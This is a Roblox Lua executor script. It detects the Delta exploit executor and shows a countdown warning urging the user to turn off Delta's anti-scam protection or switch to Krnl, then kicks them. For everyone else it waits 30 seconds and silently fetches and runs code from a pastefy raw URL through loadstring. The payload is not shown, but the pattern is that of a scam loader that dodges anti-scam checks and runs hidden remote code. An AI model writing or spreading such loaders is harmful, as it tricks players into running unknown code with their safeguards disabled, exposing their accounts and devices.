-- LocalScript (StarterGui or StarterPlayerScripts)
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Detect Delta executor
local function isUsingDelta()
	return (identifyexecutor and identifyexecutor():lower():find("delta")) or 
	       (getexecutorname and getexecutorname():lower():find("delta"))
end

-- Show warning UI for Delta
local function showExecutorWarning()
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "ExecutorWarning"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0.4, 0, 0.4, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = frame

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
	titleLabel.Font = Enum.Font.SourceSansBold
	titleLabel.TextScaled = true
	titleLabel.Text = "⚠️ Executor Not Supported"
	titleLabel.Parent = frame

	local body = Instance.new("TextLabel")
	body.Size = UDim2.new(1, -20, 0.45, 0)
	body.Position = UDim2.new(0, 10, 0.2, 0)
	body.BackgroundTransparency = 1
	body.TextColor3 = Color3.fromRGB(255, 255, 255)
	body.Font = Enum.Font.SourceSans
	body.TextScaled = true
	body.TextWrapped = true
	body.TextYAlignment = Enum.TextYAlignment.Top
	body.Text = "You're using an unsupported executor (Delta).\n\nTo fix:\n- Turn off anti-scam in Delta\n- Or use Krnl executor."
	body.Parent = frame

	local countdownLabel = Instance.new("TextLabel")
	countdownLabel.Size = UDim2.new(1, 0, 0.15, 0)
	countdownLabel.Position = UDim2.new(0, 0, 0.68, 0)
	countdownLabel.BackgroundTransparency = 1
	countdownLabel.Font = Enum.Font.SourceSansBold
	countdownLabel.TextScaled = true
	countdownLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
	countdownLabel.Text = "Closing in 47 seconds..."
	countdownLabel.Parent = frame

	local copyButton = Instance.new("TextButton")
	copyButton.Size = UDim2.new(0.6, 0, 0.15, 0)
	copyButton.Position = UDim2.new(0.2, 0, 0.85, 0)
	copyButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
	copyButton.Font = Enum.Font.SourceSansBold
	copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	copyButton.TextScaled = true
	copyButton.Text = "Copy Krnl Link"
	copyButton.Parent = frame

	local buttonCorner = Instance.new("UICorner")
	buttonCorner.CornerRadius = UDim.new(0, 6)
	buttonCorner.Parent = copyButton

	copyButton.MouseButton1Click:Connect(function()
		local link = "https://krnl.place" -- Replace with your own link
		if setclipboard then
			setclipboard(link)
			copyButton.Text = "Link copied!"
		else
			copyButton.Text = "Clipboard unsupported"
		end
	end)

	local countdown = 47
	while countdown > 0 do
		countdownLabel.Text = "Closing in " .. countdown .. " seconds..."
		task.wait(1)
		countdown -= 1
	end

	player:Kick("Unsupported executor (Delta) detected.")
end

-- Main logic
if isUsingDelta() then
	showExecutorWarning()
else
	-- Wait 30 seconds before executing external script
	task.delay(30, function()
		loadstring(game:HttpGet("https://pastefy.app/tOuvOPsz/raw"))()
	end)
end
